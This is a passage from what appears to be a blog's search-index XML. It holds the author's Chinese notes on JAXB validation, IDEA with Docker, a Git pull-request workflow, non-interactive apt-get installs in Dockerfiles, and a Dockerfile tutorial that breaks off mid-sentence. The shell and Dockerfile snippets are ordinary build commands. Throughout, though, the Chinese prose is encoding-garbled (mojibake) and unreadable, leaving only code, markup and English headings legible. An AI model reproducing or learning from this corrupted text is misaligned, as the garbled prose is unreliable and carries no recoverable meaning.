punctuation">;</span></code></pre></li><li><p>é»˜è®¤éªŒè¯äº‹ä»¶å¤„ç†ç¨‹åºå¤„ç†éªŒè¯é”™è¯¯ï¼Œç”Ÿæˆè¾“å‡ºåˆ°<code>system.out</code>ï¼Œç„¶åæŠ›å‡ºå¼‚å¸¸.</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span> <span class="token class-name">UnmarshalException</span> ue <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Caught UnmarshalException"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span> <span class="token class-name">JAXBException</span> je <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     je<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span> <span class="token class-name">IOException</span> ioe <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    ioe<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3 id="Building-and-Running-the-Unmarshal-Validate-Example-Using-Ant">Building and Running the Unmarshal Validate Example Using Ant</h3><p>è¦ä½¿ç”¨ Ant ç¼–è¯‘å’Œè¿è¡Œ Unmarshal Validate ç¤ºä¾‹ï¼Œè¯·åœ¨ç»ˆç«¯çª—å£ä¸­ï¼Œè½¬åˆ°<em>jaxb-ri-install</em> <code>/samples/unmarshal-validate/</code>ç›®å½•å¹¶é”®å…¥ä»¥ä¸‹å†…å®¹ï¼š</p><pre class="language-none"><code class="language-none">ant </code></pre></div>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
          <category> JAXB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> ç¬”è®° </tag>
            
            <tag> Xml </tag>
            
            <tag> JAXB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA é…ç½®Docker æœ¬åœ°ç¯å¢ƒå¼€å‘Java</title>
      <link href="/posts/8904d55a/"/>
      <url>/posts/8904d55a/</url>
      
        <content type="html"><![CDATA[<h1>IDEA é…ç½®docker æœ¬åœ°ç¯å¢ƒå¼€å‘java</h1><blockquote><p>ğŸ˜„ @by sizaif</p><p>ğŸ“† 2021-05-17  22:52:02</p></blockquote><p>[TOC]</p><h2 id="è¯´æ˜">è¯´æ˜</h2><div class="story post-story"><p>åˆæ­¥çš„æ€è·¯æ˜¯:  åœ¨windowså¹³å°ä¸‹ ä½¿ç”¨<code>idea</code>è°ƒè¯•ä»£ç , é€šè¿‡ docker é…ç½®è¿è¡Œlinuxç¯å¢ƒ, è¿æ¥åˆ°docker å®¹å™¨ä¸­, åœ¨dockerå®¹å™¨ä¸­è¿è¡Œä»£ç </p></div><h2 id="å®‰è£…dockeræ’ä»¶">å®‰è£…dockeræ’ä»¶</h2><div class="story post-story"><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210517230344.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210517230344.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210517230343009"></p></div><h2 id="docker-winwdos-å¼€å¯tcpè¿œç¨‹è¿æ¥">docker-winwdos å¼€å¯tcpè¿œç¨‹è¿æ¥</h2><div class="story post-story"><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210517230657.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210517230657.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210517230655846"></p></div><h2 id="ideaä¸­é…ç½®dockerç¯å¢ƒ">ideaä¸­é…ç½®dockerç¯å¢ƒ</h2><div class="story post-story"><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210517230527.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210517230527.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210517230526322"></p></div><h2 id="ideaé…ç½®è¿è¡Œç¯å¢ƒ">ideaé…ç½®è¿è¡Œç¯å¢ƒ</h2><div class="story post-story"><p>æœªå®Œå¾…ç»­</p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Docker </tag>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git å¤šäººåä½œ &amp; è´¡çŒ®</title>
      <link href="/posts/8ea2fec1/"/>
      <url>/posts/8ea2fec1/</url>
      
        <content type="html"><![CDATA[<h1>git å¤šäººåä½œ &amp; è´¡çŒ®</h1><blockquote><p>ğŸ˜„ @Auther by sizaif</p><p>ğŸ“† 2021-06-24  17:03:01</p></blockquote><p>[TOC]</p><h2 id="ä¿®è®¢å†å²">ä¿®è®¢å†å²</h2><div class="story post-story"><ul><li>2021-06-24  17:04:08: é¦–æ¬¡ç¼–è¾‘</li><li>2021-06-25  10:23:09: æ·»åŠ pull requestå›¾ç‰‡</li></ul></div><h2 id="æ•´ä½“æµç¨‹">æ•´ä½“æµç¨‹</h2><div class="story post-story"><p>é¦–å…ˆforkåˆ«äººçš„é¡¹ç›®åˆ°åœ¨è‡ªå·±çš„githubä»“åº“ä¸­,ç„¶åæ‹‰å–é¡¹ç›®åˆ°æœ¬åœ°å¼€å‘,å¼€å‘å®Œæˆååš<strong>Pull Request</strong></p><p><strong>åˆ«äººé¡¹ç›®(ä¸»ä»“)</strong>: <strong>upstream/master</strong></p><p><strong>è‡ªå·±è¿œç¨‹ä»“åº“:</strong> <strong>origin/master</strong></p><p><strong>æœ¬åœ°ä»“åº“</strong>: <strong>local/master</strong></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210624172846.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210624172846.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210624172845436"></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210624175036.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210624175036.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210624175034857"></p></div><h2 id="ä¿æŒä½ çš„ä»“åº“å’ŒåŸä½œè€…çš„ä»“åº“ä¸€è‡´">ä¿æŒä½ çš„ä»“åº“å’ŒåŸä½œè€…çš„ä»“åº“ä¸€è‡´</h2><div class="story post-story"><p>ä¸€æ˜¯åœ¨githubé¡¹ç›®ä¸­ç‚¹å‡»:</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210624173021.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210624173021.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210624173020096"></p><p>äºŒæ˜¯é€šè¿‡gitå‘½ä»¤å®ç°</p><details ><summary> child:codeblock open:false color:green </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#æŸ¥çœ‹æœ¬åœ°è¿œç¨‹ä»“åº“ä¿¡æ¯</span>$ <span class="token function">git</span> remote -v<span class="token comment">#æ·»åŠ ä¸»ä»“åˆ°æœ¬åœ°ä»“,å¹¶å‘½ä¸ºupstream,( è¿™ä¸ªä»“åº“ä¿æŒæœ€æ–°ä¸åŸä½œè€…çš„masterä¸€è‡´)</span>$ <span class="token function">git</span> remote <span class="token function">add</span> upstream åŸä½œè€…çš„é¡¹ç›®.git<span class="token comment">#å†æ¬¡æŸ¥çœ‹æœ¬åœ°è¿œç¨‹ä»“åº“ä¿¡æ¯,æ­¤æ—¶ upstream æ˜¾ç¤ºä¸ºåŸä½œè€…çš„é¡¹ç›®åœ°å€</span>$ <span class="token function">git</span> remote-v <span class="token comment">#å°†ä¸»ä»“fetchåˆ°æœ¬åœ°å’Œæœ¬åœ°masteråˆå¹¶</span>$ <span class="token function">git</span> pull upstream master<span class="token comment"># å°†æœ¬åœ°master pushåˆ° ä½ çš„è¿œç¨‹ä»“åº“å®ç°æœ€æ–°</span>$ <span class="token function">git</span> push</code></pre>              </div>            </details></div><h2 id="Pull-Request">Pull Request</h2><div class="story post-story"><p>å½“æœ¬åœ°å¼€å‘å®Œ,æƒ³pull ç»™ä½œè€…è´¡çŒ®æ—¶, ç”¨åˆ°<strong>pull request</strong></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210624174805.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210624174805.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210624174804380"></p><p>åœ¨æ¥ä¸‹æ¥çš„ç•Œé¢ä¸­,æ·»åŠ ä¸€ä¸‹ä½ çš„ä¸»è¦å·¥ä½œå†…å®¹,è®©åŸä½œè€…å¯ä»¥æ¸…æ™°çš„ç†è§£ä½ çš„æ–°getç‚¹,</p><p>æäº¤åç­‰å¾…å³å¯.</p><p>ä¹Ÿå¯ä»¥ç›´æ¥åœ¨<em>jetbrainså®¶ idea,pycharm</em>ç­‰è½¯ä»¶é‡Œç›´æ¥æäº¤</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210625102301.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210625102301.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockerfileæ„å»ºdockeræ—¶apt-Get Installé‡åˆ°äº¤äº’å¼å¤„ç†æ–¹æ³•</title>
      <link href="/posts/37be8a52/"/>
      <url>/posts/37be8a52/</url>
      
        <content type="html"><![CDATA[<h1>Dockerfileæ„å»ºdockeræ—¶apt-get installé‡åˆ°äº¤äº’å¼å¤„ç†æ–¹æ³•</h1><blockquote><p>ğŸ˜„ @auther by sizaif</p><p>ğŸ“†2021-07-01  02:20:43</p></blockquote><p>[TOC]</p><h2 id="ç¼–è¾‘å†å²">ç¼–è¾‘å†å²</h2><div class="story post-story"><ul><li>2021-07-01  02:21:01: ç¬¬ä¸€æ¬¡ç¼–è¾‘</li></ul></div><h2 id="é—®é¢˜è¯´æ˜">é—®é¢˜è¯´æ˜</h2><div class="story post-story"><p>å½“ä½¿ç”¨Dockerfileæ„å»ºdockeræ—¶,æ‰§è¡Œå‘½ä»¤<code>apt-get install -y build-essential </code> æ—¶,ä¼šå®‰è£…tzdata,</p><p>ä½†ä»tzdata 2018ç‰ˆæœ¬å¼€å§‹ï¼ˆå¦‚2018dï¼‰ï¼Œå®‰è£…è¿‡ç¨‹ä¸­é»˜è®¤é‡‡ç”¨äº¤äº’å¼ï¼Œå³è¦æ±‚è¾“å…¥æŒ‡å®šçš„<strong>Geographic area</strong>å’Œ<strong>Time zone</strong>ï¼Œä»è€Œå¿…é¡»äººå·¥å€¼å®ˆè¿›è¡Œå®‰è£…ï¼Œè¾“å‡ºä¿¡æ¯å¦‚ä¸‹ã€‚</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210701022542.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210701022542.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210701022541213"></p><p>è€ŒDockerfileæ„å»ºè¿‡ç¨‹ä¸­,æ— æ³•è¿›è¡Œäº¤äº’.</p></div><h2 id="è§£å†³æ–¹æ³•">è§£å†³æ–¹æ³•</h2><div class="story post-story"><p>åœ¨ <code>apt-get install -y </code> å‘½ä»¤å‰ æ·»åŠ   <font color='orange'>DEBIAN_FRONTEND=noninteractive</font></p><p>å³:</p><pre class="language-bash" data-language="bash"><code class="language-bash">RUN <span class="token assign-left variable">DEBIAN_FRONTEND</span><span class="token operator">=</span>noninteractive <span class="token function">apt-get</span> <span class="token function">install</span> -y <span class="token operator">&lt;</span>software name<span class="token operator">></span></code></pre><p><font color='red'>æ³¨:</font></p><p><font color='red'><code>DEBIAN_FRONTEND=noninteractive</code> åŒæ ·é€‚ç”¨äºshell è„šæœ¬</font></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
            <tag> æŠ€æœ¯å‘ </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockerfile Tutorial</title>
      <link href="/posts/f8a23a09/"/>
      <url>/posts/f8a23a09/</url>
      
        <content type="html"><![CDATA[<h1>Dockerfile Tutorial</h1><blockquote><p>ğŸ˜„ @Auther: sizaif</p><p>ğŸ“†2021-06-08  15:30:38</p></blockquote><p>[TOC]</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210608161945.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210608161945.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210608161944400"></p><p>Dockerfile æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶å†…åŒ…å«äº†ä¸€æ¡æ¡çš„ <strong>æŒ‡ä»¤(Instruction)</strong>ï¼Œæ¯ä¸€æ¡æŒ‡ä»¤æ„å»ºä¸€å±‚ï¼Œå› æ­¤æ¯ä¸€æ¡æŒ‡ä»¤çš„å†…å®¹ï¼Œå°±æ˜¯æè¿°è¯¥å±‚åº”å½“å¦‚ä½•æ„å»ºã€‚</p><p>è¿˜ä»¥ä¹‹å‰å®šåˆ¶ <code>nginx</code> é•œåƒä¸ºä¾‹ï¼Œè¿™æ¬¡æˆ‘ä»¬ä½¿ç”¨ Dockerfile æ¥å®šåˆ¶ã€‚</p><p>åœ¨ä¸€ä¸ªç©ºç™½ç›®å½•ä¸­ï¼Œå»ºç«‹ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå¹¶å‘½åä¸º <code>Dockerfile</code>ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">mkdir</span> mynginx$ <span class="token builtin class-name">cd</span> mynginx$ <span class="token function">touch</span> Dockerfile</code></pre><p>å…¶å†…å®¹ä¸ºï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">FROM nginxRUN <span class="token builtin class-name">echo</span> <span class="token string">'&lt;h1>Hello, Docker!&lt;/h1>'</span> <span class="token operator">></span> /usr/share/nginx/html/index.html</code></pre><p>è¿™ä¸ª Dockerfile å¾ˆç®€å•ï¼Œä¸€å…±å°±ä¸¤è¡Œã€‚æ¶‰åŠåˆ°äº†ä¸¤æ¡æŒ‡ä»¤ï¼Œ<code>FROM</code> å’Œ <code>RUN</code>ã€‚</p><h2 id="FROM">FROM</h2><div class="story post-story"><p><code>FROM</code> å°±æ˜¯æŒ‡å®š <strong>åŸºç¡€é•œåƒ</strong>ï¼Œå› æ­¤ä¸€ä¸ª <code>Dockerfile</code> ä¸­ <code>FROM</code> æ˜¯å¿…å¤‡çš„æŒ‡ä»¤ï¼Œå¹¶ä¸”å¿…é¡»æ˜¯ç¬¬ä¸€æ¡æŒ‡ä»¤ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">FROM XXX<span class="token punctuation">..</span>.</code></pre><p>åœ¨ <a href="https://hub.docker.com/search?q=&amp;type=image&amp;image_filter=official">Docker Hub</a> ä¸Šæœ‰éå¸¸å¤šçš„é«˜è´¨é‡çš„å®˜æ–¹é•œåƒï¼Œæœ‰å¯ä»¥ç›´æ¥æ‹¿æ¥ä½¿ç”¨çš„æœåŠ¡ç±»çš„é•œåƒï¼Œå¦‚ <a href="https://hub.docker.com/_/nginx/"><code>nginx</code></a>ã€<a href="https://hub.docker.com/_/redis/"><code>redis</code></a>ã€<a href="https://hub.docker.com/_/mongo/"><code>mongo</code></a>ã€<a href="https://hub.docker.com/_/mysql/"><code>mysql</code></a>ã€<a href="https://hub.docker.com/_/httpd/"><code>httpd</code></a>ã€<a href="https://hub.docker.com/_/php/"><code>php</code></a>ã€<a href="https://hub.docker.com/_/tomcat/"><code>tomcat</code></a> ç­‰ï¼›ä¹Ÿæœ‰ä¸€äº›æ–¹ä¾¿å¼€å‘ã€æ„å»ºã€è¿è¡Œå„ç§è¯­è¨€åº”ç”¨çš„é•œåƒï¼Œå¦‚ <a href="https://hub.docker.com/_/node"><code>node</code></a>ã€<a href="https://hub.docker.com/_/openjdk/"><code>openjdk</code></a>ã€<a href="https://hub.docker.com/_/python/"><code>python</code></a>ã€<a href="https://hub.docker.com/_/ruby/"><code>ruby</code></a>ã€<a href="https://hub.docker.com/_/golang/"><code>golang</code></a> ç­‰ã€‚å¯ä»¥åœ¨å…¶ä¸­å¯»æ‰¾ä¸€ä¸ªæœ€ç¬¦åˆæˆ‘ä»¬æœ€ç»ˆç›®æ ‡çš„é•œåƒä¸ºåŸºç¡€é•œåƒè¿›è¡Œå®šåˆ¶ã€‚</p><p>å¦‚æœæ²¡æœ‰æ‰¾åˆ°å¯¹åº”æœåŠ¡çš„é•œåƒï¼Œå®˜æ–¹é•œåƒä¸­è¿˜æä¾›äº†ä¸€äº›æ›´ä¸ºåŸºç¡€çš„æ“ä½œç³»ç»Ÿé•œåƒï¼Œå¦‚ <a href="https://hub.docker.com/_/ubuntu/"><code>ubuntu</code></a>ã€<a href="https://hub.docker.com/_/debian/"><code>debian</code></a>ã€<a href="https://hub.docker.com/_/centos/"><code>centos</code></a>ã€<a href="https://hub.docker.com/_/fedora/"><code>fedora</code></a>ã€<a href="https://hub.docker.com/_/alpine/"><code>alpine</code></a> ç­‰ï¼Œè¿™äº›æ“ä½œç³»ç»Ÿçš„è½¯ä»¶åº“ä¸ºæˆ‘ä»¬æä¾›äº†æ›´å¹¿é˜”çš„æ‰©å±•ç©ºé—´ã€‚</p></div><h2 id="RUN-æ‰§è¡Œå‘½ä»¤">RUN æ‰§è¡Œå‘½ä»¤</h2><div class="story post-story"><p><code>RUN</code> æŒ‡ä»¤æ˜¯ç”¨æ¥æ‰§è¡Œå‘½ä»¤è¡Œå‘½ä»¤çš„ã€‚ç”±äºå‘½ä»¤è¡Œçš„å¼ºå¤§èƒ½åŠ›ï¼Œ<code>RUN</code> æŒ‡ä»¤åœ¨å®šåˆ¶é•œåƒæ—¶æ˜¯æœ€å¸¸ç”¨çš„æŒ‡ä»¤ä¹‹ä¸€ã€‚å…¶æ ¼å¼æœ‰ä¸¤ç§ï¼š</p><ul><li><em>shell</em> æ ¼å¼ï¼š<code>RUN &lt;å‘½ä»¤&gt;</code>ï¼Œå°±åƒç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥çš„å‘½ä»¤ä¸€æ ·ã€‚åˆšæ‰å†™çš„ Dockerfile ä¸­çš„ <code>RUN</code> æŒ‡ä»¤å°±æ˜¯è¿™ç§æ ¼å¼ã€‚</li></ul><pre class="language-none"><code class="language-none">RUN echo &#39;&lt;h1&gt;Hello, Docker!&lt;&#x2F;h1&gt;&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html</code></pre><ul><li><em>exec</em> æ ¼å¼ï¼š<code>RUN [&quot;å¯æ‰§è¡Œæ–‡ä»¶&quot;, &quot;å‚æ•°1&quot;, &quot;å‚æ•°2&quot;]</code>ï¼Œè¿™æ›´åƒæ˜¯å‡½æ•°è°ƒç”¨ä¸­çš„æ ¼å¼ã€‚</li></ul><p>æ—¢ç„¶ <code>RUN</code> å°±åƒ Shell è„šæœ¬ä¸€æ ·å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å°±å¯ä»¥åƒ Shell è„šæœ¬ä¸€æ ·æŠŠæ¯ä¸ªå‘½ä»¤å¯¹åº”ä¸€ä¸ª RUN å‘¢ï¼Ÿæ¯”å¦‚è¿™æ ·ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">FROM debian:stretchRUN <span class="token function">apt-get</span> updateRUN <span class="token function">apt-get</span> <span class="token function">install</span> -y gcc libc6-dev <span class="token function">make</span> <span class="token function">wget</span>RUN <span class="token function">wget</span> -O redis.tar.gz <span class="token string">"http://download.redis.io/releases/redis-5.0.3.tar.gz"</span>RUN <span class="token function">mkdir</span> -p /usr/src/redisRUN <span class="token function">tar</span> -xzf redis.tar.gz -C /usr/src/redis --strip-components<span class="token operator">=</span><span class="token number">1</span>RUN <span class="token function">make</span> -C /usr/src/redisRUN <span class="token function">make</span> -C /usr/src/redis <span class="token function">install</span></code></pre><p>ä¹‹å‰è¯´è¿‡ï¼ŒDockerfile ä¸­æ¯ä¸€ä¸ªæŒ‡ä»¤éƒ½ä¼šå»ºç«‹ä¸€å±‚ï¼Œ<code>RUN</code> ä¹Ÿä¸ä¾‹å¤–ã€‚æ¯ä¸€ä¸ª <code>RUN</code> çš„è¡Œä¸ºï¼Œå°±å’Œåˆšæ‰æˆ‘ä»¬æ‰‹å·¥å»ºç«‹é•œåƒçš„è¿‡ç¨‹ä¸€æ ·ï¼šæ–°å»ºç«‹ä¸€å±‚ï¼Œåœ¨å…¶ä¸Šæ‰§è¡Œè¿™äº›å‘½ä»¤ï¼Œæ‰§è¡Œç»“æŸåï¼Œ<code>commit</code> è¿™ä¸€å±‚çš„ä¿®æ”¹ï¼Œæ„æˆæ–°çš„é•œåƒã€‚</p><p><strong>è€Œä¸Šé¢çš„è¿™ç§å†™æ³•ï¼Œåˆ›å»ºäº† 7 å±‚é•œåƒã€‚è¿™æ˜¯å®Œå…¨æ²¡æœ‰æ„ä¹‰çš„ï¼Œè€Œä¸”å¾ˆå¤šè¿è¡Œæ—¶ä¸éœ€è¦çš„ä¸œè¥¿ï¼Œéƒ½è¢«è£…è¿›äº†é•œåƒé‡Œï¼Œæ¯”å¦‚ç¼–è¯‘ç¯å¢ƒã€æ›´æ–°çš„è½¯ä»¶åŒ…ç­‰ç­‰ã€‚ç»“æœå°±æ˜¯äº§ç”Ÿéå¸¸è‡ƒè‚¿ã€éå¸¸å¤šå±‚çš„é•œåƒï¼Œä¸ä»…ä»…å¢åŠ äº†æ„å»ºéƒ¨ç½²çš„æ—¶é—´ï¼Œä¹Ÿå¾ˆå®¹æ˜“å‡ºé”™ã€‚ è¿™æ˜¯å¾ˆå¤šåˆå­¦ Docker çš„äººå¸¸çŠ¯çš„ä¸€ä¸ªé”™è¯¯ã€‚</strong></p><p><em>Union FS æ˜¯æœ‰æœ€å¤§å±‚æ•°é™åˆ¶çš„ï¼Œæ¯”å¦‚ AUFSï¼Œæ›¾ç»æ˜¯æœ€å¤§ä¸å¾—è¶…è¿‡ 42 å±‚ï¼Œç°åœ¨æ˜¯ä¸å¾—è¶…è¿‡ 127 å±‚ã€‚</em></p><p>ä¸Šé¢çš„ <code>Dockerfile</code> æ­£ç¡®çš„å†™æ³•åº”è¯¥æ˜¯è¿™æ ·ï¼š</p><details green><summary> Dickerfile </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash">FROM debian:stretchRUN <span class="token builtin class-name">set</span> -x<span class="token punctuation">;</span> <span class="token assign-left variable">buildDeps</span><span class="token operator">=</span><span class="token string">'gcc libc6-dev make wget'</span> <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> update <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> <span class="token function">install</span> -y <span class="token variable">$buildDeps</span> <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">wget</span> -O redis.tar.gz <span class="token string">"http://download.redis.io/releases/redis-5.0.3.tar.gz"</span> <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">mkdir</span> -p /usr/src/redis <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">tar</span> -xzf redis.tar.gz -C /usr/src/redis --strip-components<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> -C /usr/src/redis <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> -C /usr/src/redis <span class="token function">install</span> <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -rf /var/lib/apt/lists/* <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> redis.tar.gz <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -r /usr/src/redis <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> purge -y --auto-remove <span class="token variable">$buildDeps</span></code></pre>              </div>            </details><p>é¦–å…ˆï¼Œä¹‹å‰æ‰€æœ‰çš„å‘½ä»¤åªæœ‰ä¸€ä¸ªç›®çš„ï¼Œå°±æ˜¯ç¼–è¯‘ã€å®‰è£… redis å¯æ‰§è¡Œæ–‡ä»¶ã€‚å› æ­¤æ²¡æœ‰å¿…è¦å»ºç«‹å¾ˆå¤šå±‚ï¼Œè¿™åªæ˜¯ä¸€å±‚çš„äº‹æƒ…ã€‚å› æ­¤ï¼Œè¿™é‡Œæ²¡æœ‰ä½¿ç”¨å¾ˆå¤šä¸ª <code>RUN</code> ä¸€ä¸€å¯¹åº”ä¸åŒçš„å‘½ä»¤ï¼Œè€Œæ˜¯ä»…ä»…ä½¿ç”¨ä¸€ä¸ª <code>RUN</code> æŒ‡ä»¤ï¼Œå¹¶ä½¿ç”¨ <code>&amp;&amp;</code> å°†å„ä¸ªæ‰€éœ€å‘½ä»¤ä¸²è”èµ·æ¥ã€‚<strong>å°†ä¹‹å‰çš„ 7 å±‚ï¼Œç®€åŒ–ä¸ºäº† 1 å±‚ã€‚åœ¨æ’°å†™ Dockerfile çš„æ—¶å€™ï¼Œè¦ç»å¸¸æé†’è‡ªå·±ï¼Œè¿™å¹¶ä¸æ˜¯åœ¨å†™ Shell è„šæœ¬ï¼Œè€Œæ˜¯åœ¨å®šä¹‰æ¯ä¸€å±‚è¯¥å¦‚ä½•æ„å»ºã€‚</strong></p><p>å¹¶ä¸”ï¼Œè¿™é‡Œä¸ºäº†æ ¼å¼åŒ–è¿˜è¿›è¡Œäº†æ¢è¡Œã€‚<strong>Dockerfile æ”¯æŒ Shell ç±»çš„è¡Œå°¾æ·»åŠ  <code>\</code> çš„å‘½ä»¤æ¢è¡Œæ–¹å¼ï¼Œä»¥åŠè¡Œé¦– <code>#</code> è¿›è¡Œæ³¨é‡Šçš„æ ¼å¼ã€‚è‰¯å¥½çš„æ ¼å¼ï¼Œæ¯”å¦‚æ¢è¡Œã€ç¼©è¿›ã€æ³¨é‡Šç­‰ï¼Œä¼šè®©ç»´æŠ¤ã€æ’éšœæ›´ä¸ºå®¹æ˜“ï¼Œè¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„ä¹ æƒ¯ã€‚</strong></p><p>æ­¤å¤–ï¼Œè¿˜å¯ä»¥çœ‹åˆ°è¿™ä¸€ç»„å‘½ä»¤çš„æœ€åæ·»åŠ äº†æ¸…ç†å·¥ä½œçš„å‘½ä»¤ï¼Œåˆ é™¤äº†ä¸ºäº†ç¼–è¯‘æ„å»ºæ‰€éœ€è¦çš„è½¯ä»¶ï¼Œæ¸…ç†äº†æ‰€æœ‰ä¸‹è½½ã€å±•å¼€çš„æ–‡ä»¶ï¼Œå¹¶ä¸”è¿˜æ¸…ç†äº† <code>apt</code> ç¼“å­˜æ–‡ä»¶ã€‚è¿™æ˜¯å¾ˆé‡è¦çš„ä¸€æ­¥ï¼Œæˆ‘ä»¬ä¹‹å‰è¯´è¿‡ï¼Œé•œåƒæ˜¯å¤šå±‚å­˜å‚¨ï¼Œæ¯ä¸€å±‚çš„ä¸œè¥¿å¹¶ä¸ä¼šåœ¨ä¸‹ä¸€å±‚è¢«åˆ é™¤ï¼Œä¼šä¸€ç›´è·Ÿéšç€é•œåƒã€‚å› æ­¤é•œåƒæ„å»ºæ—¶ï¼Œä¸€å®šè¦ç¡®ä¿æ¯ä¸€å±‚åªæ·»åŠ çœŸæ­£éœ€è¦æ·»åŠ çš„ä¸œè¥¿ï¼Œä»»ä½•æ— å…³çš„ä¸œè¥¿éƒ½åº”è¯¥æ¸…ç†æ‰ã€‚</p><p>å¾ˆå¤šäººåˆå­¦ Docker åˆ¶ä½œå‡ºäº†å¾ˆè‡ƒè‚¿çš„é•œåƒçš„åŸå› 